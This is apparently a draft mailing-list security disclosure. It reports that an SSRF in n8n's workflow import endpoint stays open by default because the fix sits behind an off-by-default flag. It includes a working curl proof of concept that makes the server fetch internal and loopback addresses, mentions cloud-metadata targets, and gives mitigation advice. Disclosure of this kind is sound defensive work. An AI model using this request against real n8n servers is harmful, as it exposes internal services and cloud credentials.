# oss-sec draft — n8n from-url SSRF (incomplete / default-off fix)

Send to: oss-security@lists.openwall.com
Format: plain text, inline (no HTML, no attachments). Keep the body below as-is.

---

Subject: n8n: SSRF in /rest/workflows/from-url remains exploitable in default configuration (incomplete fix, no CVE)

Hello,

This reports a server-side request forgery (SSRF) in n8n's workflow import
endpoint that was fixed in n8n 2.20.0, but only when an opt-in flag is enabled.
On a default install — including the current release, 2.28.2 — the endpoint
remains exploitable. n8n shipped the fix as an ordinary bugfix; no CVE or
security advisory was assigned, so operators are not told this is a security-
relevant change they need to act on.

Product:  n8n (https://github.com/n8n-io/n8n)
Affected: <= 2.19.x unconditionally; 2.20.0 .. 2.28.2 (latest) when
          N8N_SSRF_PROTECTION_ENABLED is not set to true (the default)
Type:     SSRF (CWE-918)
CVE:      none assigned

== Summary ==

GET /rest/workflows/from-url takes a user-controlled "url" query parameter and
makes a server-side HTTP request to it. Any authenticated user with the
member-level workflow:create permission in any project can use it to make the
n8n server fetch arbitrary URLs, including loopback (127.0.0.1), link-local
(169.254.0.0/16, i.e. cloud metadata), and RFC1918 internal addresses. When the
fetched target returns JSON shaped like an n8n workflow ({"nodes":...,
"connections":...}), the response body is reflected back to the caller.

== The fix, and why it is incomplete ==

In packages/cli/src/workflows/workflows.controller.ts the handler now routes the
URL through n8n's SsrfProtectionService:

    private async fetchWorkflowFromUrl(url: string) {
      const client = this.outboundHttp.requests({
        ssrf: this.ssrfConfig.enabled ? this.ssrfProtectionService : 'disabled',
      });
      ...
    }

Protection is conditional on this.ssrfConfig.enabled. That flag defaults to off.
From packages/@n8n/config/src/configs/ssrf-protection.config.ts (verified on tag
n8n@2.28.2):

    @Env('N8N_SSRF_PROTECTION_ENABLED')
    enabled: boolean = false;

So on a default install fetchWorkflowFromUrl passes ssrf: 'disabled' and performs
an unvalidated outbound request. The SSRF is unmitigated out of the box on every
release including the latest. When the flag IS set to true the protection is
robust (pre-flight + connect-time secure DNS lookup defeating rebinding +
per-redirect-hop validation against loopback/link-local/RFC1918).

           N8N_SSRF_PROTECTION_ENABLED=true   default (flag unset)
  <=2.19.x  vulnerable                          vulnerable
  2.20.0+   protected                           VULNERABLE

== Proof of concept (executed against n8nio/n8n:2.28.2, 2026-06-27) ==

Default install, no flags:

    docker run -d -p 5678:5678 -e N8N_SECURE_COOKIE=false n8nio/n8n:2.28.2
    # create owner, obtain auth cookie and a personal projectId, then point the
    # import at an internal RFC1918 host running a logging listener:

    curl -s -G -b cookies.txt 'http://localhost:5678/rest/workflows/from-url' \
      --data-urlencode "projectId=$PROJECT_ID" \
      --data-urlencode 'url=http://172.17.0.1:8888/'

Result (protection OFF / default) -- the fetch fires and the body is reflected:

    {"data":{"nodes":[],"connections":{},"secret":"SSRF_CONFIRMED_2282"}}
    --> HTTP 200

Listener access log on the internal host (server-side proof, request originates
from the n8n container 172.17.0.2, User-Agent "n8n"):

    2026-06-27T04:20:15Z VICTIM-HIT path=/ UA=n8n from=172.17.0.2

A loopback target (http://127.0.0.1:5678/rest/settings) likewise fires the
server-side request, returning HTTP 400 only because the body is not
workflow-shaped -- the request has already been made.

Contrast -- identical request with N8N_SSRF_PROTECTION_ENABLED=true:

    {"code":0,"message":"The request was blocked because it resolves to a restricted IP address"}
    --> HTTP 400

With the flag on, no request reaches the listener (no new log entry). This
confirms the protection exists and works, and that the default-off setting is
the sole reason the latest release is exploitable out of the box.

== Vendor handling ==

The fix (PR #29178, https://github.com/n8n-io/n8n/pull/29178, merged 2026-04-29,
released in 2.20.0 on 2026-05-05) was independent internal n8n work tracked under
their ticket CAT-2890; it was opened before, and is unrelated to, my own
report of the same issue on 2026-04-29. I am not claiming credit for the fix.
n8n's security team reviewed my report and on 2026-05-20 determined it did not
qualify. No CVE or advisory was issued for the change.

I am posting because, regardless of that history, the current released behavior
is a real and verifiable SSRF that is unmitigated in the default configuration.

== Mitigation for operators ==

Set N8N_SSRF_PROTECTION_ENABLED=true. This routes the import endpoint (and the
HTTP Request node path) through the IP blocklist. Verify with the PoC above
(it should then be rejected). Consider also restricting egress at the network
layer.

A CVE for the default-configuration exposure would help operators track this; I
have not obtained one. Suggestions on assignment welcome.

Regards,
Akshat Sinha
Public write-up: https://github.com/akshatgit/public-disclosure/blob/main/advisories/2026-06-26-n8n-ssrf-workflows-from-url.md
